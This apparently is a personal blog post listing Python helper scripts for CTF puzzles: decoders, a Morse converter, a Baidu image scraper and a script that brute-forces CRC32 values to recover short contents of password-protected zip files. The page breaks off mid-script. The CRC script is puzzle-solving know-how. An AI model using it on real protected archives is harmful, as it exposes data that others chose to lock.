<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    
    
    <title>一些我常用的py脚本(持续更新) | Damya&#39;s Blog | あややこやや</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="keywords" content="python">
    <link rel="shortcut icon" href="/img/favicon.ico">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
    <link rel="stylesheet" href="/css/style.css?v=1.4.4">
    
    <script type="text/javascript">
        // Data Center
        var DC = {
            reward:	true,
            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
            d: JSON.parse('{"app_id":null}')
        };
    </script>
    <script type="text/javascript">
        window.lazyScripts=[];
    </script>
    
<link rel="alternate" href="/atom.xml" title="Damya's Blog" type="application/atom+xml">
</head>


<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="">
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap">
      
      <img src="/img/brand.jpg" class="brand-bg">
      
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Damya</h5>
          <a href="mailto:397526596@qq.com" title="397526596@qq.com" class="mail">
            
              <span>3</span>
            
              <span>9</span>
            
              <span>7</span>
            
              <span>5</span>
            
              <span>2</span>
            
              <span>6</span>
            
              <span>5</span>
            
              <span>9</span>
            
              <span>6</span>
            
              <span>@</span>
            
              <span>q</span>
            
              <span>q</span>
            
              <span>.</span>
            
              <span>c</span>
            
              <span>o</span>
            
              <span>m</span>
            
          </a>
        </hgroup>
        
        <ul class="menu-link">
          
              <li>
                <a href="https://github.com/DamyaHome" target="_blank">
                  <i class="icon icon-lg icon-github"></i>
                </a>
              </li>
            
        </ul>
        
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                HOME
              </a>
            </li>
        
            <li class="">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                CATEGORIES
              </a>
            </li>
        
            <li class="">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                TAGS
              </a>
            </li>
        
            <li class="">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                ARCHIVES
              </a>
            </li>
        
            <li class="">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                ABOUT
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row clearfix">
        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">
            <span>一些我常用的py脚本(持续更新)</span>
            
        </div>
        
        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
            <i class="icon icon-lg icon-search"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">
    <img src="/img/banner.jpg" class="header-bg">
    <div class="container fade-scale">
        <h1 class="title">一些我常用的py脚本(持续更新)</h1>
        <h5 class="subtitle">
            
                <time datetime="2019-06-11T13:30:21.000Z" itemprop="datePublished" class="page-time">
  2019-06-11
</time>


	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/脚本/">脚本</a></li></ul>

            
        </h5>
        
    </div>
    

</header>

<div id="site_search">
    <div class="search-title clearfix">
        <span class="pull-left">
          <i class="icon icon-lg icon-search"></i>
        </span>
        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
          <i class="icon icon-lg icon-close"></i>
        </a>
    </div>
    <div id="local-search-result"></div>
</div>


<div class="container body-wrap">
    <article id="post-一些我常用的py脚本(持续更新)"
  class="post-article article-type-post" itemprop="blogPost">
    <div class="post-card">
        <h1 class="post-card-title">一些我常用的py脚本(持续更新)</h1>
        <div class="post-meta">
            <time class="post-time" title="2019-06-11 21:30:21" datetime="2019-06-11T13:30:21.000Z"  itemprop="datePublished">2019-06-11</time>

            
	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/脚本/">脚本</a></li></ul>



            

            


            
        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            
            <h2 id="批处理修改文件后缀名-当前目录下"><a href="#批处理修改文件后缀名-当前目录下" class="headerlink" title="批处理修改文件后缀名(当前目录下)"></a>批处理修改文件后缀名(当前目录下)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##python批量更换后缀名</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># 列出当前目录下所有的文件</span></span><br><span class="line">files = os.listdir(<span class="string">'.'</span>)</span><br><span class="line"><span class="comment">#print('files',files)</span></span><br><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> files:</span><br><span class="line">  portion = os.path.splitext(filename)</span><br><span class="line">  <span class="comment"># 如果后缀是.dat</span></span><br><span class="line">  <span class="keyword">if</span> portion[<span class="number">1</span>] == <span class="string">".filename"</span>: </span><br><span class="line">    <span class="comment"># 重新组合文件名和后缀名</span></span><br><span class="line">    newname = portion[<span class="number">0</span>] + <span class="string">".newname"</span> </span><br><span class="line">    os.rename(filename,newname)</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="进制转换解码脚本"><a href="#进制转换解码脚本" class="headerlink" title="进制转换解码脚本"></a>进制转换解码脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> chardet</span><br><span class="line"></span><br><span class="line">a = <span class="string">b"\345\260\274\345\217\244\346\213\211\346\226\257\350\265\265\345\233\233"</span></span><br><span class="line"><span class="comment">#判断当前字符串的格式（编码类型）</span></span><br><span class="line">fencoding = chardet.detect(a)  </span><br><span class="line"></span><br><span class="line">print(fencoding)</span><br><span class="line"><span class="comment">#编码类型为打印出来的fencoding编码类型</span></span><br><span class="line">a = a.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="ascil码转字符串或解base64"><a href="#ascil码转字符串或解base64" class="headerlink" title="ascil码转字符串或解base64"></a>ascil码转字符串或解base64</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ascil码转字符串或解base64</span></span><br><span class="line"><span class="comment"># import base64</span></span><br><span class="line">a=<span class="string">'102 108 97 103 123 52 55 101 100 98 56 51 48 48 101 100 53 102 57 98 50 56 102 99 53 52 98 48 100 48 57 101 99 100 101 102 55 125'</span></span><br><span class="line">a=a.split(<span class="string">' '</span>)</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    flag=flag+chr(int(i))</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment"># print flag.decode('base64')</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="完整base64解码-txt输入输出"><a href="#完整base64解码-txt输入输出" class="headerlink" title="完整base64解码(txt输入输出)"></a>完整base64解码(txt输入输出)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">f = open(<span class="string">'out.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">f1 = open(<span class="string">'out1.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line">f1.write(str(base64.b64decode(f.read())))</span><br><span class="line">f.close()</span><br><span class="line">f1.close()</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="批量crc32碰撞"><a href="#批量crc32碰撞" class="headerlink" title="批量crc32碰撞"></a>批量crc32碰撞</h2><p>注释:解压后是68个压缩包,拖进winhex分析,不是伪加密,hint提示是base64,每个文件是4b,所以每个bata.txt应该是4个字符,写脚本进行批量crc32碰撞<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span><span class="params">(crc)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> dic:</span><br><span class="line">                    s = a + b + c + d</span><br><span class="line">                    <span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line">                        <span class="comment">#print(s)</span></span><br><span class="line">                        f.write(s)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackZip</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">68</span>):</span><br><span class="line">        file = <span class="string">'out'</span> + str(i) + <span class="string">'.zip'</span></span><br><span class="line">        f = zipfile.ZipFile(file,<span class="string">'r'</span>)</span><br><span class="line">        GetCrc = f.getinfo(<span class="string">'data.txt'</span>)</span><br><span class="line">        crc = GetCrc.CRC</span><br><span class="line">        CrackCrc(crc)</span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters + string.digits + <span class="string">'+/='</span></span><br><span class="line"><span class="comment">#dic = string.printable</span></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'out.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line">CrackZip()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="批量图片爬取-百度"><a href="#批量图片爬取-百度" class="headerlink" title="批量图片爬取(百度)"></a>批量图片爬取(百度)</h2><p>需要不同人的需要在脚本目录下新建一个包含关键词的txt<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> error</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line">num = <span class="number">0</span></span><br><span class="line">numPicture = <span class="number">0</span></span><br><span class="line">file = <span class="string">''</span></span><br><span class="line">List = []</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Find</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> List</span><br><span class="line">    print(<span class="string">'正在检测图片总数，请稍等.....'</span>)</span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> t &lt; <span class="number">1000</span>:</span><br><span class="line">        Url = url + str(t)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            Result = requests.get(Url, timeout=<span class="number">7</span>)</span><br><span class="line">        <span class="keyword">except</span> BaseException:</span><br><span class="line">            t = t + <span class="number">60</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result = Result.text</span><br><span class="line">            pic_url = re.findall(<span class="string">'"objURL":"(.*?)",'</span>, result, re.S)  <span class="comment"># 先利用正则表达式找到图片url</span></span><br><span class="line">            s += len(pic_url)</span><br><span class="line">            <span class="keyword">if</span> len(pic_url) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                List.append(pic_url)</span><br><span class="line">                t = t + <span class="number">60</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recommend</span><span class="params">(url)</span>:</span></span><br><span class="line">    Re = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        html = requests.get(url)</span><br><span class="line">    <span class="keyword">except</span> error.HTTPError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        html.encoding = <span class="string">'utf-8'</span></span><br><span class="line">        bsObj = BeautifulSoup(html.text, <span class="string">'html.parser'</span>)</span><br><span class="line">        div = bsObj.find(<span class="string">'div'</span>, id=<span class="string">'topRS'</span>)</span><br><span class="line">        <span class="keyword">if</span> div <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            listA = div.findAll(<span class="string">'a'</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> listA:</span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    Re.append(i.get_text())</span><br><span class="line">        <span class="keyword">return</span> Re</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dowmloadPicture</span><span class="params">(html, keyword)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="comment"># t =0</span></span><br><span class="line">    pic_url = re.findall(<span class="string">'"objURL":"(.*?)",'</span>, html, re.S)  <span class="comment"># 先利用正则表达式找到图片url</span></span><br><span class="line">    print(<span class="string">'找到关键词:'</span> + keyword + <span class="string">'的图片，即将开始下载图片...'</span>)</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> pic_url:</span><br><span class="line">        print(<span class="string">'正在下载第'</span> + str(num + <span class="number">1</span>) + <span class="string">'张图片，图片地址:'</span> + str(each))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> each <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                pic = requests.get(each, timeout=<span class="number">7</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">except</span> BaseException:</span><br><span class="line">            print(<span class="string">'错误，当前图片无法下载'</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            string = file + <span class="string">r'\\'</span> + keyword + <span class="string">'_'</span> + str(num) + <span class="string">'.jpg'</span></span><br><span class="line">            fp = open(string, <span class="string">'wb'</span>)</span><br><span class="line">            fp.write(pic.content)</span><br><span class="line">            fp.close()</span><br><span class="line">            num += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> num &gt;= numPicture:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:  <span class="comment"># 主函数入口</span></span><br><span class="line">    word = input(<span class="string">"请输入搜索关键词(可以是人名，地名等): "</span>)</span><br><span class="line">    <span class="comment">#add = 'http://image.baidu.com/search/flip?tn=baiduimage&amp;ie=utf-8&amp;word=%E5%BC%A0%E5%A4%A9%E7%88%B1&amp;pn=120'</span></span><br><span class="line">    url = <span class="string">'http://image.baidu.com/search/flip?tn=baiduimage&amp;ie=utf-8&amp;word='</span> + word + <span class="string">'&amp;pn='</span></span><br><span class="line">    tot = Find(url)</span><br><span class="line">    Recommend = recommend(url)  <span class="comment"># 记录相关推荐</span></span><br><span class="line">    print(<span class="string">'经过检测%s类图片共有%d张'</span> % (word, tot))</span><br><span class="line">    numPicture = int(input(<span class="string">'请输入想要下载的图片数量 '</span>))</span><br><span class="line">    file = input(<span class="string">'请建立一个存储图片的文件夹，输入文件夹名称即可'</span>)</span><br><span class="line">    y = os.path.exists(file)</span><br><span class="line">    <span class="keyword">if</span> y == <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">'该文件已存在，请重新输入'</span>)</span><br><span class="line">        file = input(<span class="string">'请建立一个存储图片的文件夹，)输入文件夹名称即可'</span>)</span><br><span class="line">        os.mkdir(file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        os.mkdir(file)</span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    tmp = url</span><br><span class="line">    <span class="keyword">while</span> t &lt; numPicture:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = tmp + str(t)</span><br><span class="line">            result = requests.get(url, timeout=<span class="number">10</span>)</span><br><span class="line">            print(url)</span><br><span class="line">        <span class="keyword">except</span> error.HTTPError <span class="keyword">as</span> e:</span><br><span class="line">            print(<span class="string">'网络错误，请调整网络后重试'</span>)</span><br><span class="line">            t = t+<span class="number">60</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            dowmloadPicture(result.text, word)</span><br><span class="line">            t = t + <span class="number">60</span></span><br><span class="line"> </span><br><span class="line">    print(<span class="string">'当前搜索结束，感谢使用'</span>)</span><br><span class="line">    print(<span class="string">'猜你喜欢'</span>)</span><br><span class="line">    <span class="keyword">for</span> re <span class="keyword">in</span> Recommend:</span><br><span class="line">        print(re, end=<span class="string">'  '</span>)</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="统计字符频率"><a href="#统计字符频率" class="headerlink" title="统计字符频率"></a>统计字符频率</h2><p>统计一个文件里字符出现的频率<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"file.txt"</span>)</span><br><span class="line">txt = f.read()</span><br><span class="line">c = Counter()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> txt:</span><br><span class="line">    c[i] = c[i]+<span class="number">1</span></span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="将十六进制错位转ascil输出"><a href="#将十六进制错位转ascil输出" class="headerlink" title="将十六进制错位转ascil输出"></a>将十六进制错位转ascil输出</h2><p>做题时发现的脚本,存一下说不定以后有用<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> io  </span><br><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"></span><br><span class="line"><span class="comment">#改变标准输出的默认编码 </span></span><br><span class="line"><span class="comment">#utf-8中文乱码</span></span><br><span class="line">sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">s = [<span class="number">0x4c</span>,<span class="number">0xa6</span>,<span class="number">0x49</span>,<span class="number">0x24</span>,<span class="number">0xa5</span>,<span class="number">0x18</span>,<span class="number">0x54</span>,<span class="number">0xa1</span>,</span><br><span class="line"><span class="number">0x8b</span>,<span class="number">0x14</span>,<span class="number">0x80</span>,<span class="number">0xd1</span>,<span class="number">0x49</span>,<span class="number">0x92</span>,<span class="number">0xc4</span>,<span class="number">0x65</span>,</span><br><span class="line"><span class="number">0x45</span>,<span class="number">0x15</span>,<span class="number">0x38</span>,<span class="number">0x62</span>,<span class="number">0x40</span>,<span class="number">0x4d</span>,<span class="number">0x50</span>,<span class="number">0x94</span>,</span><br><span class="line"><span class="number">0x29</span>,<span class="number">0x92</span>,<span class="number">0x84</span>,<span class="number">0x41</span>,<span class="number">0x45</span>,<span class="number">0xc9</span>,<span class="number">0x41</span>,<span class="number">0x35</span>,</span><br><span class="line"><span class="number">0x52</span>,<span class="number">0x5c</span>,<span class="number">0xa6</span>,<span class="number">0x45</span>,<span class="number">0x50</span>,<span class="number">0xa3</span>,<span class="number">0x4a</span>,<span class="number">0x4c</span>,</span><br><span class="line"><span class="number">0x83</span>,<span class="number">0x13</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">160</span>):</span><br><span class="line">    flag=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(s)):</span><br><span class="line">        flag+=chr(s[j]-i)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="解摩斯密码"><a href="#解摩斯密码" class="headerlink" title="解摩斯密码"></a>解摩斯密码</h2><p>只能输出大写字母,后续再添加功能,更新了所有的符号<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line">a =<span class="string">".-....-.--.---.-.-.-..-......-........-..---..--.-"</span></span><br><span class="line">s = a.split(<span class="string">"/"</span>)</span><br><span class="line">dict = &#123;<span class="string">'.-'</span>: <span class="string">'A'</span>,</span><br><span class="line">        <span class="string">'-...'</span>: <span class="string">'B'</span>,</span><br><span class="line">        <span class="string">'-.-.'</span>: <span class="string">'C'</span>,</span><br><span class="line">        <span class="string">'-..'</span>:<span class="string">'D'</span>,</span><br><span class="line">        <span class="string">'.'</span>:<span class="string">'E'</span>,</span><br><span class="line">        <span class="string">'..-.'</span>:<span class="string">'F'</span>,</span><br><span class="line">        <span class="string">'--.'</span>: <span class="string">'G'</span>,</span><br><span class="line">        <span class="string">'....'</span>: <span class="string">'H'</span>,</span><br><span class="line">        <span class="string">'..'</span>: <span class="string">'I'</span>,</span><br><span class="line">        <span class="string">'.---'</span>:<span class="string">'J'</span>,</span><br><span class="line">        <span class="string">'-.-'</span>: <span class="string">'K'</span>,</span><br><span class="line">        <span class="string">'.-..'</span>: <span class="string">'L'</span>,</span><br><span class="line">        <span class="string">'--'</span>: <span class="string">'M'</span>,</span><br><span class="line">        <span class="string">'-.'</span>: <span class="string">'N'</span>,</span><br><span class="line">        <span class="string">'---'</span>: <span class="string">'O'</span>,</span><br><span class="line">        <span class="string">'.--.'</span>: <span class="string">'P'</span>,</span><br><span class="line">        <span class="string">'--.-'</span>: <span class="string">'Q'</span>,</span><br><span class="line">        <span class="string">'.-.'</span>: <span class="string">'R'</span>,</span><br><span class="line">        <span class="string">'...'</span>: <span class="string">'S'</span>,</span><br><span class="line">        <span class="string">'-'</span>: <span class="string">'T'</span>,</span><br><span class="line">        <span class="string">'..-'</span>: <span class="string">'U'</span>,</span><br><span class="line">        <span class="string">'...-'</span>: <span class="string">'V'</span>,</span><br><span class="line">        <span class="string">'.--'</span>: <span class="string">'W'</span>,</span><br><span class="line">        <span class="string">'-..-'</span>: <span class="string">'X'</span>,</span><br><span class="line">        <span class="string">'-.--'</span>: <span class="string">'Y'</span>,</span><br><span class="line">        <span class="string">'--..'</span>: <span class="string">'Z'</span>,</span><br><span class="line">        <span class="string">'.----'</span>: <span class="string">'1'</span>,</span><br><span class="line">        <span class="string">'..---'</span>: <span class="string">'2'</span>,</span><br><span class="line">        <span class="string">'...--'</span>: <span class="string">'3'</span>,</span><br><span class="line">        <span class="string">'....-'</span>: <span class="string">'4'</span>,</span><br><span class="line">        <span class="string">'.....'</span>: <span 